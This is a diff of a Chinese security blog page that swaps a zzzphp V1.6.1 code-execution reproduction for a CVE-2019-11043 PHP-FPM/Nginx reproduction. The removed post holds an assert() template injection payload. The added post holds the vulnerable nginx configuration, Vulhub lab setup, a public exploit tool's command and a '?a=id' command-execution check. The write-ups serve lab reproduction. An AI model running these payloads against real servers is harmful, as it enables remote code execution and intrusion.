@@ -4,12 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="zzzphp V1.6.1 远程代码执行漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="一、漏洞概述远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。
-
-二、漏洞复现本地搭建zzzphp V1.6.1环境
-在后台模块管理中的电脑模块找到cn2016
-然后在cn201">
+    <meta name="keywords" content="PHP-FPM在Nginx特定配置下远程代码执行漏洞复现, dylan&#39;s blog">
+    <meta name="description" content="0x01 漏洞概述在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。
+Ng">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>zzzphp V1.6.1 远程代码执行漏洞复现 | dylan&#39;s blog</title>
+    <title>PHP-FPM在Nginx特定配置下远程代码执行漏洞复现 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -277,13 +274,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        zzzphp V1.6.1 远程代码执行漏洞复现
+                        PHP-FPM在Nginx特定配置下远程代码执行漏洞复现
                     </div>
                 </div>
             </div>
@@ -394,16 +391,24 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
-                            </a>
-                        
                             <a href="/tags/复现/" target="_blank">
                                 <span class="chip bg-color">复现</span>
                             </a>
                         
-                            <a href="/tags/zzzphp/" target="_blank">
-                                <span class="chip bg-color">zzzphp</span>
+                            <a href="/tags/PHP/" target="_blank">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/Nginx/" target="_blank">
+                                <span class="chip bg-color">Nginx</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/" target="_blank">
+                                <span class="chip bg-color">RCE</span>
+                            </a>
+                        
+                            <a href="/tags/CVE-2019-11043/" target="_blank">
+                                <span class="chip bg-color">CVE-2019-11043</span>
                             </a>
                         
                     </div>
@@ -426,21 +431,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-24
+                    2019-10-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        180
+                        482
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        2 分
                     </div>
                     
                 
@@ -456,15 +461,46 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，<br>导致在后台可以写入php代码从而造成代码执行。</p>
-<hr>
-<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建zzzphp V1.6.1环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141219.png" alt></p>
-<p>在后台模块管理中的电脑模块找到cn2016<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141335.png" alt></p>
-<p>然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<br><code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141523.png" alt></p>
-<p>然后打开<code>http://xxx/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141748.png" alt></p>
-<hr>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4471" target="_blank" rel="noopener">zzzphp V1.6.1 远程代码执行漏洞分析</a><br><a href="https://www.anquanke.com/post/id/173991" target="_blank" rel="noopener">zzzphpV1.6.1 远程代码执行漏洞简单分析</a></p>
+                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，<br>向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p>
+<p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。<br>而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。<br>攻击者通过精心的构造和利用，可以导致远程代码执行。</p>
+<p>漏洞编号：CVE-2019-11043</p>
+<p>漏洞 PoC 在 10 月 22 日公开。</p>
+<h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><p><strong>PHP 5.6-7.x</strong></p>
+<p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>
+<pre><code> location ~ [^/]\.php(/|$) {
+
+        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
+
+        fastcgi_param PATH_INFO       $fastcgi_path_info;
+
+        fastcgi_pass   php:9000;
+
+        ...
+  }
+}</code></pre><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10<br>靶    机:  Vulhub靶场</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">Vulhub</a>已有相关漏洞靶场，按教程搭建即可。</p>
+<pre><code>mkdir CVE-2019-11043
+cd CVE-2019-11043/
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml
+mkdir www
+cd www/
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php
+cd ../
+service docker start
+docker-compose up -d</code></pre><p>搭建好之后，访问 <code>http://ip:8080/index.php</code> 即可。</p>
+<p>在<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">Github</a>下载相应的工具<br>(需要安装Git，或者直接下载)<br>生成<code>phuip-fpizdam</code>工具<br>（需要安装go环境）</p>
+<pre><code>git clone https://github.com/neex/phuip-fpizdam.git
+cd phuip-fpizdam
+go build</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223540.png" alt></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在生成工具的文件夹 执行命令</p>
+<p><code>phuip-fpizdam.exe http://ip:8080/index.php</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223937.png" alt></p>
+<p>然后访问</p>
+<p><code>http://your-ip:8080/index.php?a=id</code></p>
+<p><strong>注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。</strong></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023224120.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">phuip-fpizdam: Exploit for CVE-2019-11043</a><br><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">PHP :: Sec Bug #78599 :: env_path_info underflow in fpm_main.c can lead to RCE</a><br><a href="https://qiita.com/shimizukawasaki/items/39d68a7c658dfa50263d?from=timeline&isappinstalled=0" target="_blank" rel="noopener">[漏洞复现]CVE-2019-11043/PHP-FPM在Nginx特定配置下远程代码执行 - Qiita</a></p>
 
             </div>
             <hr/>
@@ -623,9 +659,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《zzzphp V1.6.1 远程代码执行漏洞复现》
+                    《PHP-FPM在Nginx特定配置下远程代码执行漏洞复现》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -928,24 +964,26 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/">
+                <a href="/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="树洞外链X_FORWARDED_FOR注入漏洞复现">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ThinkCMF框架任意内容包含漏洞复现">
                         
-                        <span class="card-title">树洞外链X_FORWARDED_FOR注入漏洞复现</span>
+                        <span class="card-title">ThinkCMF框架任意内容包含漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述树洞外链现在已经停止更新，作者又开发了Cloudreve，有兴趣可以了解一下。回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可
+                            0x00 漏洞概述ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。
+利用此漏洞无需任何权限情况下，构造恶意的url，可以向服务器写入任意内容的文件，实现远程代码执行。
+0x01 影
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-25
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-24
                         </span>
                         <span class="publish-author">
                             
@@ -962,16 +1000,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
-                    </a>
-                    
                     <a href="/tags/复现/" target="_blank">
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/树洞外链/" target="_blank">
-                        <span class="chip bg-color">树洞外链</span>
+                    <a href="/tags/ThinkCMF/" target="_blank">
+                        <span class="chip bg-color">ThinkCMF</span>
+                    </a>
+                    
+                    <a href="/tags/任意内容包含/" target="_blank">
+                        <span class="chip bg-color">任意内容包含</span>
                     </a>
                     
                 </div>
@@ -985,30 +1023,24 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/">
+                <a href="/2019/10/20/kibana-rce-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="dedecms V5.7-UTF-8-SP2 命令执行漏洞复现">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="kibana远程代码执行漏洞复现">
                         
-                        <span class="card-title">dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</span>
+                        <span class="card-title">kibana远程代码执行漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述
-
-二、漏洞分析环境搭建这里不再赘述，搭建好后访问网站主页
-dedecms默认的后台是/dede,没有修改直接访问登陆
-根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件
-代码分析
-(1
+                            0x01 漏洞概述Elasticsearch Kibana是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具。Kibana 5.6.15之前版本和6.6.1之前版本中的Timelio
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-23
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-20
                             </span>
                         <span class="publish-author">
                             
@@ -1025,16 +1057,20 @@ dedecms默认的后台是/dede,没有修改直接访问登陆
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
-                    </a>
-                    
                     <a href="/tags/复现/" target="_blank">
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/dedecms/" target="_blank">
-                        <span class="chip bg-color">dedecms</span>
+                    <a href="/tags/RCE/" target="_blank">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                    <a href="/tags/kibana/" target="_blank">
+                        <span class="chip bg-color">kibana</span>
+                    </a>
+                    
+                    <a href="/tags/Elasticsearch/" target="_blank">
+                        <span class="chip bg-color">Elasticsearch</span>
                     </a>
                     
                 </div>
